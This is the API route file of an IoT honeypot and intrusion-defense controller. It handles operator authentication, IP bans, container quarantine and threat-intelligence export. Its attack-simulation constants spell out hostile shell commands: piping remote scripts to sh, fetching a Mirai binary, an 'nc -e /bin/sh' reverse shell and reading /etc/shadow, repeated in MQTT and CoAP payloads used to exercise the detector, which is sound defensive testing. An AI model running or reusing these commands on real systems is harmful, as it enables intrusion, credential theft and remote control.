import asyncio
import ipaddress
import json
import logging
import random
import time
from typing import Any, AsyncGenerator, Dict, List, Optional, Set, Tuple

from fastapi import APIRouter, Body, Header, HTTPException, Request, Response
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel, Field

from controller.api.sse_broker import SSEBroadcaster
from controller.core.auth import (
    AccountDeactivated,
    AuthService,
    InvalidCredentials,
    RateLimitExceeded,
)
from controller.core.device_discovery import get_default_discovery_subnet, get_discovery_subnets_info, run_lan_discovery
from controller.core.device_manager import RealDeviceManager
from controller.core.detector import IntrusionDetector
from controller.core.models import CowrieEvent, MitigationRecord
from controller.core.stix_exporter import generate_stix_bundle
from controller.core.watchdog import DefenseWatchdog
from controller.core.webhook_notifier import WebhookNotifier
from controller.mitigation.quarantine import QuarantineManager

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api")

# Curated multi-IP pools using RFC 5737 TEST-NET documentation ranges
ATTACK_IP_POOLS: Dict[str, List[str]] = {
    "brute-force": [
        "198.51.100.99",
        "198.51.100.142",
        "198.51.100.205",
        "203.0.113.45",
        "192.0.2.81",
    ],
    "exploit": [
        "203.0.113.88",
        "203.0.113.154",
        "203.0.113.219",
        "198.51.100.175",
        "192.0.2.114",
    ],
    "port-sweep": [
        "198.51.100.77",
        "198.51.100.188",
        "192.0.2.63",
        "203.0.113.92",
        "192.0.2.199",
    ],
    "mqtt-exploit": [
        "198.51.100.112",
        "198.51.100.165",
        "203.0.113.71",
        "203.0.113.140",
        "192.0.2.98",
    ],
    "coap-probe": [
        "198.51.100.133",
        "198.51.100.168",
        "203.0.113.111",
        "203.0.113.220",
        "192.0.2.145",
    ],
}

EXPLOIT_PAYLOADS: Tuple[str, ...] = (
    "curl -s http://malicious.payload/botnet.sh | sh",
    "wget http://malicious.payload/mirai.arm7 -O /tmp/m && chmod +x /tmp/m",
    "nc -e /bin/sh 192.0.2.55 4444",
    "cat /etc/shadow && rm -rf /tmp/traces",
    "wget http://198.51.100.10/loader.sh -O - | /bin/bash",
)

MQTT_EXPLOIT_PAYLOADS: Tuple[Tuple[str, str], ...] = (
    ("home/admin/config", '{"cmd": "curl -s http://malicious.payload/botnet.sh | sh", "admin": true}'),
    ("home/system/firmware_update", '{"firmware_url": "http://198.51.100.10/loader.sh; chmod +x /tmp/loader"}'),
    ("home/debug/shell", '{"exec": "/bin/sh -c rm -rf /tmp/traces"}'),
    ("home/gateway/exec", '{"payload": "nc -e /bin/sh 192.0.2.55 4444"}'),
    ("home/admin/credentials", '{"action": "dump_users", "format": "cat /etc/shadow"}'),
)

COAP_SIMULATION_PATHS: Tuple[str, ...] = (
    "/.well-known/core",
    "/sensors/temperature",
    "/actuators/switch/override",
    "/debug/firmware?cmd=curl%20-s%20http://malicious.sh|sh",
    "/sensors/ambient",
)


class UnbanRequest(BaseModel):
    ip: str = Field(..., description="Target IPv4 or IPv6 address to unban")
    admin_user: Optional[str] = Field("soc_admin", description="Identity executing the unban action")


class AttackSimulationRequest(BaseModel):
    src_ip: Optional[str] = Field(None, description="Optional explicit attacker IPv4 or IPv6 address")
    mode: str = Field("single", description="Simulation mode: 'single', 'random', or 'swarm'")


class TrafficModeRequest(BaseModel):
    mode: str = Field(..., description="Active telemetry mode: 'simulated' or 'live'")


class DeviceCreateRequest(BaseModel):
    device_id: str = Field(..., description="Unique alphanumeric device ID (e.g. cam_front_door)")
    name: str = Field(..., description="Friendly display name (e.g. Front Gate CCTV)")
    device_type: str = Field("cctv_camera", description="cctv_camera | iot_sensor | smart_actuator | edge_gateway")
    protocol: str = Field("rtsp_http", description="mqtt | rtsp_http | http_webhook")
    ip_address: str = Field(..., description="Device LAN/external IPv4 or IPv6 address")
    port: int = Field(554, description="Primary reachable TCP port (e.g. 554 RTSP, 80 HTTP, 1883 MQTT)")
    mqtt_topic: Optional[str] = Field("", description="Optional MQTT topic under home/#")
    snapshot_url: Optional[str] = Field("", description="Optional HTTP/HTTPS CCTV snapshot or MJPEG URL")


class DeviceBlockRequest(BaseModel):
    reason: Optional[str] = Field("Operator logical quarantine", description="Reason for blocking device ingestion")
    admin_user: Optional[str] = Field("soc_admin", description="Operator identity")


class DeviceUpdateRequest(BaseModel):
    name: str = Field(..., min_length=1, max_length=100, description="Friendly display name for the IoT/CCTV device")


class DeviceIngestRequest(BaseModel):
    payload: Dict[str, Any] = Field(default_factory=dict, description="JSON telemetry/event payload from physical IoT device")


class DeviceDiscoverRequest(BaseModel):
    subnet: Optional[str] = Field(None, description="Optional target subnet CIDR (e.g. 192.168.1.0/24)")
    timeout: float = Field(2.0, description="Discovery scan timeout in seconds")


class WebhookConfigRequest(BaseModel):
    url: str = Field(..., description="Destination webhook URL (HTTP/HTTPS)")
    enabled: bool = Field(True, description="Whether automated mitigation dispatch is enabled")
    format: str = Field("generic", description="Payload format: generic | slack | discord")


class LoginRequest(BaseModel):
    username: str = Field(..., min_length=1, max_length=64, description="SOC operator username")
    password: str = Field(..., min_length=1, max_length=128, description="Operator password")


class UserCreateRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=32, description="Alphanumeric operator username")
    password: str = Field(..., min_length=8, max_length=128, description="Strong password")
    full_name: str = Field(..., min_length=1, max_length=100, description="Full display name")
    email: str = Field(..., min_length=3, max_length=120, description="Contact email address")
    role: str = Field("operator", description="Role: admin | operator | analyst")


def _resolve_simulation_targets(
    attack_type: str,
    payload: Optional[AttackSimulationRequest],
) -> Tuple[List[str], str]:
    """Resolves attacker IP(s) from explicit input, random pool selection, or swarm mode."""
    pool = ATTACK_IP_POOLS[attack_type]
    if payload is None:
        return [pool[0]], "single"

    mode = (payload.mode or "single").strip().lower()
    if mode not in {"single", "random", "swarm"}:
        raise HTTPException(status_code=400, detail=f"Unsupported simulation mode: '{payload.mode}'")

    if mode == "swarm":
        return list(pool), "swarm"
    if mode == "random":
        return [random.choice(pool)], "random"

    if payload.src_ip:
        candidate = payload.src_ip.strip()
        try:
            normalized_ip = str(ipaddress.ip_address(candidate))
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=f"Invalid IP address '{candidate}': {exc}") from exc
        return [normalized_ip], "single"

    return [pool[0]], "single"


def make_response(
    status: str = "success",
    data: Optional[Dict[str, Any]] = None,
    message: str = "",
) -> Dict[str, Any]:
    """Helper ensuring consistent API response shapes across all endpoints."""
    return {
        "status": status,
        "timestamp": time.time(),
        "data": data or {},
        "message": message,
    }


def get_detector(request: Request) -> IntrusionDetector:
    return request.app.state.detector


def get_quarantine_manager(request: Request) -> QuarantineManager:
    return request.app.state.quarantine_manager


def get_broadcaster(request: Request) -> SSEBroadcaster:
    return request.app.state.sse_broadcaster


def get_device_manager(request: Request) -> RealDeviceManager:
    return request.app.state.device_manager


def get_webhook_notifier(request: Request) -> WebhookNotifier:
    notifier = getattr(request.app.state, "webhook_notifier", None)
    if not notifier:
        detector = get_detector(request)
        notifier = WebhookNotifier(db=detector.db)
        request.app.state.webhook_notifier = notifier
    return notifier


def get_watchdog(request: Request) -> DefenseWatchdog:
    watchdog = getattr(request.app.state, "watchdog", None)
    if not watchdog:
        detector = get_detector(request)
        quarantine = get_quarantine_manager(request)
        broadcaster = get_broadcaster(request)
        watchdog = DefenseWatchdog(
            firewall=detector.firewall,
            detector=detector,
            db=detector.db,
            quarantine=quarantine,
            on_alert_callback=lambda event, data: broadcaster.broadcast(event, data),
        )
        request.app.state.watchdog = watchdog
    return watchdog


def get_auth_service(request: Request) -> AuthService:
    """Retrieves the singleton AuthService instance."""
    auth_service = getattr(request.app.state, "auth_service", None)
    if not auth_service:
        detector = get_detector(request)
        auth_service = AuthService(db=detector.db)
        request.app.state.auth_service = auth_service
    return auth_service


def get_current_session(request: Request, require: bool = False) -> Optional[Dict[str, Any]]:
    """Extracts and validates the current active session from Bearer token or HttpOnly cookie."""
    auth_service = get_auth_service(request)
    auth_header = request.headers.get("Authorization", "")
    token = ""
    if auth_header.startswith("Bearer "):
        token = auth_header[7:].strip()
    elif "soc_session" in request.cookies:
        token = request.cookies["soc_session"]

    session = auth_service.validate_session(token) if token else None
    if require and not session:
        raise HTTPException(status_code=401, detail="Authentication required. Please sign in.")
    return session


def require_admin(request: Request) -> Dict[str, Any]:
    """Ensures the caller has administrative privileges."""
    session = get_current_session(request, require=True)
    if session["role"] != "admin":
        raise HTTPException(
            status_code=403,
            detail="Access denied. Action requires SOC Administrator privileges.",
        )
    return session


def _ensure_simulated_mode(request: Request) -> None:
    """Rejects synthetic simulation calls when controller is running in strict Live Traffic mode."""
    current_mode = getattr(request.app.state, "traffic_mode", "simulated")
    if current_mode != "simulated":
        raise HTTPException(
            status_code=409,
            detail="Simulation triggers are paused in Live Traffic mode. Switch to Simulated Traffic mode first.",
        )


@router.get("/health")
async def health_check() -> Dict[str, Any]:
    """Basic health check and service status."""
    return make_response(status="success", data={"service": "defense_controller", "status": "healthy"})


# --- SOC User Authentication & Operator Session Routes ---

@router.post("/auth/login")
async def login_operator(payload: LoginRequest, request: Request) -> Response:
    """Authenticates SOC operator credentials and establishes a secure session."""
    auth_service = get_auth_service(request)
    client_ip = request.client.host if request.client else "127.0.0.1"
    user_agent = request.headers.get("User-Agent", "")

    try:
        session_info = auth_service.authenticate_user(
            username=payload.username,
            password=payload.password,
            ip_address=client_ip,
            user_agent=user_agent,
        )
    except RateLimitExceeded as exc:
        return JSONResponse(
            status_code=429,
            content=make_response(status="error", message=str(exc)),
            headers={"Retry-After": str(exc.retry_after)},
        )
    except InvalidCredentials as exc:
        raise HTTPException(status_code=401, detail=str(exc)) from exc
    except AccountDeactivated as exc:
        raise HTTPException(status_code=403, detail=str(exc)) from exc

    response = JSONResponse(
        content=make_response(
            data=session_info,
            message=f"Operator '{session_info['user']['username']}' successfully authenticated.",
        )
    )
    # Set HttpOnly, SameSite=Lax cookie for seamless session management
    response.set_cookie(
        key="soc_session",
        value=session_info["session_id"],
        httponly=True,
        samesite="lax",
        secure=False,  # localhost HTTP deployment
        max_age=8 * 3600,
        path="/",
    )
    return response


@router.post("/auth/logout")
async def logout_operator(request: Request) -> Response:
    """Revokes active operator session and clears the authentication cookie."""
    auth_service = get_auth_service(request)
    auth_header = request.headers.get("Authorization", "")
    token = ""
    if auth_header.startswith("Bearer "):
        token = auth_header[7:].strip()
    elif "soc_session" in request.cookies:
        token = request.cookies["soc_session"]

    if token:
        auth_service.logout_session(token)

    response = JSONResponse(content=make_response(message="Session successfully terminated."))
    response.delete_cookie(key="soc_session", path="/")
    return response


@router.get("/auth/me")
async def get_current_user_profile(request: Request) -> Dict[str, Any]:
    """Returns profile and permission details for the current active session."""
    session = get_current_session(request, require=True)
    return make_response(
        data={"user": session},
        message=f"Active session valid for {session['username']} ({session['role']}).",
    )


@router.get("/auth/users")
async def list_operators(request: Request) -> Dict[str, Any]:
    """Lists all registered SOC operator accounts (Administrator only)."""
    require_admin(request)
    auth_service = get_auth_service(request)
    users = auth_service.list_operators()
    return make_response(data={"users": users, "total": len(users)})


@router.post("/auth/users")
async def create_operator_account(payload: UserCreateRequest, request: Request) -> Dict[str, Any]:
    """Provisions a new operator account (Administrator only)."""
    require_admin(request)
    auth_service = get_auth_service(request)
    try:
        new_user = auth_service.create_operator(
            username=payload.username,
            password=payload.password,
            full_name=payload.full_name,
            email=payload.email,
            role=payload.role,
        )
        return make_response(
            data={"user": new_user},
            message=f"Operator account '{new_user['username']}' provisioned successfully.",
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc


@router.get("/auth/sessions")
async def list_operator_sessions(request: Request) -> Dict[str, Any]:
    """Lists active operator sessions and connected endpoints (Administrator only)."""
    require_admin(request)
    auth_service = get_auth_service(request)
    sessions = auth_service.list_active_sessions()
    return make_response(data={"sessions": sessions, "total": len(sessions)})


@router.delete("/auth/sessions/{session_id}")
async def revoke_operator_session(session_id: str, request: Request) -> Dict[str, Any]:
    """Revokes a specific active session (Administrator only)."""
    require_admin(request)
    auth_service = get_auth_service(request)
    deleted = auth_service.revoke_session(session_id)
    if not deleted:
        raise HTTPException(status_code=404, detail="Session not found or already expired.")
    return make_response(message=f"Session '{session_id[:12]}...' revoked successfully.")


@router.get("/defense/status")
async def get_defense_status(request: Request) -> Dict[str, Any]:
    """Returns the current security inventory: active drops, banned count, and audit history."""
    detector = get_detector(request)
    quarantine = get_quarantine_manager(request)

    banned_ips = detector.firewall.list_banned_ips()
    recent_history = detector.db.get_history(limit=25)
    active_bans = detector.db.get_active_bans()

    # Dynamic inspection of IoT virtual node states
    if hasattr(quarantine, "get_all_virtual_node_states"):
        node_states = quarantine.get_all_virtual_node_states()
    else:
        node_states = {
            "iot_sensor_node": quarantine.get_container_network_status("iot_sensor_node"),
            "iot_bulb_node": quarantine.get_container_network_status("iot_bulb_node"),
            "iot_motion_node": quarantine.get_container_network_status("iot_motion_node"),
            "iot_lock_node": quarantine.get_container_network_status("iot_lock_node"),
            "iot_mqtt_broker": quarantine.get_container_network_status("iot_mqtt_broker"),
            "iot_cowrie_honeypot": quarantine.get_container_network_status("iot_cowrie_honeypot"),
        }

    device_manager = get_device_manager(request)
    traffic_mode = getattr(request.app.state, "traffic_mode", "simulated")

    return make_response(
        data={
            "traffic_mode": traffic_mode,
            "banned_ips": banned_ips,
            "banned_count": len(banned_ips),
            "active_bans": active_bans,
            "recent_mitigations": recent_history,
            "node_states": node_states,
            "registered_devices": device_manager.list_devices(),
        }
    )


# TODO(security): Require operator RBAC authentication on system mode & device registry mutations before exposing externally.
@router.get("/system/mode")
async def get_system_mode(request: Request) -> Dict[str, Any]:
    """Returns the active telemetry operating mode ('simulated' or 'live') and live endpoints."""
    current_mode = getattr(request.app.state, "traffic_mode", "simulated")
    return make_response(
        data={
            "mode": current_mode,
            "simulated_endpoints_enabled": current_mode == "simulated",
            "live_endpoints": {
                "mqtt_port": 1883,
                "honeypot_ssh_port": 2222,
                "webhook_template": "/api/devices/ingest/{device_id}",
            },
        }
    )


@router.post("/system/mode")
async def set_system_mode(payload: TrafficModeRequest, request: Request) -> Dict[str, Any]:
    """Switches strictly between Simulated Traffic and Live Traffic operational modes."""
    target_mode = (payload.mode or "").strip().lower()
    if target_mode not in {"simulated", "live"}:
        raise HTTPException(status_code=400, detail="Mode must be either 'simulated' or 'live'.")

    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    request.app.state.traffic_mode = target_mode
    detector.db.set_setting("traffic_mode", target_mode)
    await broadcaster.broadcast("mode_changed", {"mode": target_mode})

    return make_response(
        data={"mode": target_mode, "simulated_endpoints_enabled": target_mode == "simulated"},
        message=f"Switched operational mode to {target_mode.upper()} traffic.",
    )


@router.get("/stream")
async def sse_telemetry_stream(request: Request) -> StreamingResponse:
    """
    Unidirectional Server-Sent Events stream delivering real-time telemetry,
    honeypot attack records, and autonomous mitigation events to connected SOC dashboards.
    """
    broadcaster = get_broadcaster(request)
    client_queue = await broadcaster.subscribe()

    async def event_generator() -> AsyncGenerator[str, None]:
        try:
            # Send initial connection handshake
            yield f"event: connected\ndata: {{\"status\": \"connected\", \"timestamp\": {time.time()}}}\n\n"

            while True:
                # Check for client disconnect
                if await request.is_disconnected():
                    break

                try:
                    # Non-blocking wait for next event with 5-second heartbeat fallback
                    frame = await asyncio.wait_for(client_queue.get(), timeout=5.0)
                    yield frame
                except asyncio.TimeoutError:
                    # Send periodic keepalive heartbeat frame
                    yield f"event: heartbeat\ndata: {{\"type\": \"heartbeat\", \"timestamp\": {time.time()}}}\n\n"
        finally:
            await broadcaster.unsubscribe(client_queue)

    headers = {
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "X-Accel-Buffering": "no",
        "Content-Type": "text/event-stream",
    }
    return StreamingResponse(event_generator(), media_type="text/event-stream", headers=headers)


@router.post("/defense/unban")
async def manual_unban(payload: UnbanRequest, request: Request) -> Dict[str, Any]:
    """Manually revokes an iptables drop rule and updates the audit log."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.manual_unban(payload.ip, admin_user=payload.admin_user or "soc_admin")
    if not success:
        raise HTTPException(status_code=400, detail=f"Failed to remove drop rule for IP {payload.ip}")

    # Broadcast unban event over SSE
    await broadcaster.broadcast("unban_alert", {"ip": payload.ip, "unbanned_by": payload.admin_user})

    return make_response(
        message=f"Rule for IP {payload.ip} revoked successfully.",
        data={"unbanned_ip": payload.ip}
    )


@router.post("/defense/reset-bans")
async def reset_all_bans(request: Request) -> Dict[str, Any]:
    """Flushes the custom blocklist and clears active ban records."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.reset_all_bans()
    if not success:
        raise HTTPException(status_code=500, detail="Failed to flush firewall blocklist.")

    await broadcaster.broadcast("reset_alert", {"message": "All firewall blocklist rules flushed."})

    return make_response(message="All firewall drop rules have been successfully flushed.")


@router.post("/defense/reset-database")
async def reset_database_endpoint(request: Request) -> Dict[str, Any]:
    """Completely purges the audit database history, active bans, and in-memory analytics."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.reset_full_database()
    if not success:
        raise HTTPException(status_code=500, detail="Failed to reset database.")

    await broadcaster.broadcast("database_reset_alert", {
        "message": "Database audit history and analytics completely wiped."
    })

    return make_response(message="Database and audit history successfully wiped clean.")


@router.post("/simulate/infect/{node_id}")
async def simulate_node_infection(node_id: str, request: Request) -> Dict[str, Any]:
    """Simulates internal compromise of a virtual IoT container, isolating it to quarantine."""
    _ensure_simulated_mode(request)
    quarantine = get_quarantine_manager(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    res = quarantine.quarantine_container(node_id)
    if res["status"] != "success":
        return make_response(status="error", data=res, message=res["message"])

    if res.get("previous_state") == "quarantined":
        return make_response(data=res, message=f"Container {node_id} is already in quarantine.")

    node_meta = {
        "iot_sensor_node": ("172.20.0.21", "Temp Sensor 01"),
        "iot_bulb_node": ("172.20.0.22", "Smart Bulb 01"),
        "iot_motion_node": ("172.20.0.23", "Motion Sensor 02"),
        "iot_lock_node": ("172.20.0.24", "Smart Lock 01"),
        "iot_mqtt_broker": ("172.20.0.10", "MQTT Broker"),
        "iot_cowrie_honeypot": ("172.20.0.50", "Cowrie Decoy"),
    }
    src_ip, node_label = node_meta.get(node_id, ("172.20.0.0", node_id))

    # Audit mitigation record in ledger
    mit_record = MitigationRecord(
        src_ip=src_ip,
        action="QUARANTINE",
        reason=f"Compromised node isolated into quarantine subnet: {node_label} [{node_id}]",
        severity="HIGH",
    )
    mit_record.id = detector.db.record_mitigation(mit_record)

    # Broadcast quarantine state transition and ledger alert
    await broadcaster.broadcast("node_quarantined", {
        "node_id": node_id,
        "src_ip": src_ip,
        "state": "quarantined",
        "network": "iot_quarantine_net"
    })
    await broadcaster.broadcast("mitigation_alert", mit_record.to_dict())

    return make_response(data=res, message=f"Container {node_id} isolated into quarantine.")


@router.post("/simulate/restore/{node_id}")
async def restore_node_container(node_id: str, request: Request) -> Dict[str, Any]:
    """Restores an isolated IoT container back to the production network."""
    _ensure_simulated_mode(request)
    quarantine = get_quarantine_manager(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    res = quarantine.restore_container(node_id)
    if res["status"] != "success":
        return make_response(status="error", data=res, message=res["message"])

    if res.get("previous_state") == "production":
        return make_response(data=res, message=f"Container {node_id} is already in production.")

    node_meta = {
        "iot_sensor_node": ("172.20.0.21", "Temp Sensor 01"),
        "iot_bulb_node": ("172.20.0.22", "Smart Bulb 01"),
        "iot_motion_node": ("172.20.0.23", "Motion Sensor 02"),
        "iot_lock_node": ("172.20.0.24", "Smart Lock 01"),
        "iot_mqtt_broker": ("172.20.0.10", "MQTT Broker"),
        "iot_cowrie_honeypot": ("172.20.0.50", "Cowrie Decoy"),
    }
    src_ip, node_label = node_meta.get(node_id, ("172.20.0.0", node_id))

    # Audit restoration record in ledger
    mit_record = MitigationRecord(
        src_ip=src_ip,
        action="NODE_RESTORED",
        reason=f"Node restored from quarantine to production: {node_label} [{node_id}]",
        severity="INFO",
    )
    mit_record.id = detector.db.record_mitigation(mit_record)

    await broadcaster.broadcast("node_restored", {
        "node_id": node_id,
        "src_ip": src_ip,
        "state": "production",
        "network": "iot_production_net"
    })
    await broadcaster.broadcast("mitigation_alert", mit_record.to_dict())

    return make_response(data=res, message=f"Container {node_id} restored to production.")


@router.get("/simulate/attack/pools")
async def get_attack_ip_pools() -> Dict[str, Any]:
    """Returns curated attacker IP pools available for each simulation vector."""
    return make_response(data=ATTACK_IP_POOLS)


async def _emit_threshold_attack(
    detector: IntrusionDetector,
    broadcaster: SSEBroadcaster,
    target_ips: List[str],
    eventid: str,
    attempts_per_ip: int = 5,
) -> int:
    """Broadcasts and evaluates repeated threshold attack events across one or more attacker IPs."""
    events_triggered = 0
    delay = 0.02 if len(target_ips) > 1 else 0.05

    for attacker_ip in target_ips:
        for i in range(attempts_per_ip):
            if eventid == "cowrie.login.failed":
                event = CowrieEvent(
                    eventid=eventid,
                    src_ip=attacker_ip,
                    timestamp=time.time(),
                    username="root",
                    password=f"admin_pass_{i}",
                    message=f"login attempt [root/admin_pass_{i}] failed",
                    raw_data={"simulated": True},
                )
            else:
                event = CowrieEvent(
                    eventid=eventid,
                    src_ip=attacker_ip,
                    timestamp=time.time(),
                    message=f"Remote SSH version: SSH-2.0-Attacker_Probe_{i}",
                    raw_data={"simulated": True},
                )
            await broadcaster.broadcast("honeypot_hit", event.to_dict())
            detector.process_event(event)
            events_triggered += 1
            await asyncio.sleep(delay)

    return events_triggered


def _build_simulation_result(
    detector: IntrusionDetector,
    target_ips: List[str],
    mode: str,
    events_sent: int,
    pre_banned: Set[str],
    extra: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Builds standardized simulation telemetry metadata reporting newly banned vs already-banned IPs."""
    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
    already_banned = [ip for ip in target_ips if ip in pre_banned]
    newly_banned = [
        ip for ip in target_ips
        if ip not in pre_banned and ip not in protected and detector.firewall.is_ip_banned(ip)
    ]
    data: Dict[str, Any] = {
        "target_ip": target_ips[0],
        "target_ips": target_ips,
        "mode": mode,
        "events_sent": events_sent,
        "newly_banned": newly_banned,
        "already_banned": already_banned,
        "allowlist_protected": protected,
    }
    if extra:
        data.update(extra)
    return data


@router.post("/simulate/attack/brute-force")
async def trigger_simulated_bruteforce(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a credential brute-force simulation for a selected, random, custom, or swarm IP set."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("brute-force", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}

    events_triggered = await _emit_threshold_attack(
        detector=detector,
        broadcaster=broadcaster,
        target_ips=target_ips,
        eventid="cowrie.login.failed",
    )
    data = _build_simulation_result(detector, target_ips, mode, events_triggered, pre_banned)
    return make_response(
        data=data,
        message=f"Brute-force attack simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.post("/simulate/attack/exploit")
async def trigger_simulated_exploit(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a critical remote shell exploit simulation for a selected, random, custom, or swarm IP set."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("exploit", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}
    commands_used: List[str] = []

    for idx, attacker_ip in enumerate(target_ips):
        cmd = EXPLOIT_PAYLOADS[idx % len(EXPLOIT_PAYLOADS)]
        commands_used.append(cmd)
        event = CowrieEvent(
            eventid="cowrie.command.input",
            src_ip=attacker_ip,
            timestamp=time.time(),
            input_command=cmd,
            message=f"CMD: {cmd}",
            raw_data={"simulated": True},
        )
        await broadcaster.broadcast("honeypot_hit", event.to_dict())
        detector.process_event(event)
        if len(target_ips) > 1:
            await asyncio.sleep(0.03)

    data = _build_simulation_result(
        detector,
        target_ips,
        mode,
        len(target_ips),
        pre_banned,
        extra={"command": commands_used[0]},
    )
    return make_response(
        data=data,
        message=f"Terminal exploit simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.post("/simulate/attack/port-sweep")
async def trigger_simulated_port_sweep(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a rapid port reconnaissance sweep simulation for a selected, random, custom, or swarm IP set."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("port-sweep", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}

    events_triggered = await _emit_threshold_attack(
        detector=detector,
        broadcaster=broadcaster,
        target_ips=target_ips,
        eventid="cowrie.client.version",
    )
    data = _build_simulation_result(detector, target_ips, mode, events_triggered, pre_banned)
    return make_response(
        data=data,
        message=f"Reconnaissance sweep simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.post("/simulate/attack/mqtt-exploit")
async def trigger_simulated_mqtt_exploit(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers an MQTT honey-topic breach and payload injection exploit simulation."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("mqtt-exploit", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}
    exploits_used: List[str] = []

    for idx, attacker_ip in enumerate(target_ips):
        topic, mqtt_payload = MQTT_EXPLOIT_PAYLOADS[idx % len(MQTT_EXPLOIT_PAYLOADS)]
        exploits_used.append(f"{topic}: {mqtt_payload[:50]}")
        # Broadcast synthetic MQTT threat frame
        await broadcaster.broadcast("iot_telemetry", {
            "topic": topic,
            "payload": mqtt_payload,
            "timestamp": time.time(),
            "device_id": f"rogue_{attacker_ip.replace('.', '_')}",
            "device_name": f"Adversary Node ({attacker_ip})",
            "mode": "simulated",
            "threat": True,
        })
        # Evaluate directly in detector
        detector.evaluate_mqtt_message(
            topic=topic,
            payload=mqtt_payload,
            src_ip=attacker_ip,
        )
        if len(target_ips) > 1:
            await asyncio.sleep(0.03)

    data = _build_simulation_result(
        detector,
        target_ips,
        mode,
        len(target_ips),
        pre_banned,
        extra={"exploit": exploits_used[0]},
    )
    return make_response(
        data=data,
        message=f"MQTT honey-topic exploit simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.post("/simulate/attack/coap-probe")
async def trigger_simulated_coap_probe(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a CoAP IoT decoy reconnaissance and exploit simulation across UDP port 5683."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("coap-probe", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}

    for attacker_ip in target_ips:
        for uri in COAP_SIMULATION_PATHS:
            cmd_payload = "cmd=cat /etc/shadow" if "curl" in uri else ""
            detector.evaluate_coap_probe(
                src_ip=attacker_ip,
                uri_path=uri,
                payload=cmd_payload,
            )
            await broadcaster.broadcast("honeypot_hit", {
                "eventid": "coap.probe.hit",
                "src_ip": attacker_ip,
                "dst_port": 5683,
                "protocol": "UDP:5683",
                "uri": uri,
                "timestamp": time.time(),
            })
            await asyncio.sleep(0.01)

    data = _build_simulation_result(
        detector,
        target_ips,
        mode,
        len(target_ips) * len(COAP_SIMULATION_PATHS),
        pre_banned,
        extra={"target_port": "UDP:5683", "protocol": "CoAP (RFC 7252)"},
    )
    return make_response(
        data=data,
        message=f"CoAP decoy probe simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.get("/defense/analytics")
async def get_defense_analytics(request: Request) -> Dict[str, Any]:
    """Returns aggregated honeypot threat intelligence and attack analytics."""
    detector = get_detector(request)
    stats = detector.get_analytics()
    return make_response(data=stats)


@router.get("/defense/forensics/{ip}")
async def get_ip_forensics(ip: str, request: Request) -> Dict[str, Any]:
    """Returns deep chronological forensic timeline and event history for a specific IP."""
    detector = get_detector(request)
    forensics = detector.get_ip_forensics(ip)
    return make_response(data=forensics)


@router.get("/defense/export")
async def export_audit_report(request: Request) -> Dict[str, Any]:
    """Exports full audit and forensic records for external SIEM / compliance reporting."""
    detector = get_detector(request)
    analytics = detector.get_analytics()
    history = detector.db.get_history(limit=200)
    banned_ips = detector.firewall.list_banned_ips()

    export_payload = {
        "report_generated_at": time.time(),
        "total_active_drops": len(banned_ips),
        "banned_ips": banned_ips,
        "threat_intelligence": analytics,
        "mitigation_audit_log": history,
    }
    return make_response(data=export_payload, message="SOC Audit Report generated successfully.")


@router.get("/defense/export/stix")
async def export_stix_bundle(
    request: Request,
    limit: int = 200,
) -> JSONResponse:
    """Generates and downloads an OASIS STIX 2.1 Cyber Threat Intelligence JSON bundle."""
    detector = get_detector(request)
    history = detector.db.get_history(limit=limit)
    threat_events = detector.db.get_recent_threat_events(limit=limit)
    banned_ips_list = detector.firewall.list_banned_ips()
    active_bans_records = [{"src_ip": ip, "reason": "Active Netfilter Ban", "severity": "HIGH"} for ip in banned_ips_list]

    stix_bundle = generate_stix_bundle(
        history=history,
        threat_events=threat_events,
        active_bans=active_bans_records,
    )
    return JSONResponse(
        content=stix_bundle,
        media_type="application/stix+json",
        headers={
            "Content-Disposition": f'attachment; filename="stix_threat_intel_{int(time.time())}.json"'
        },
    )


@router.get("/defense/webhook/config")
async def get_webhook_config(request: Request) -> Dict[str, Any]:
    """Retrieves current outbound SIEM / notification webhook configuration."""
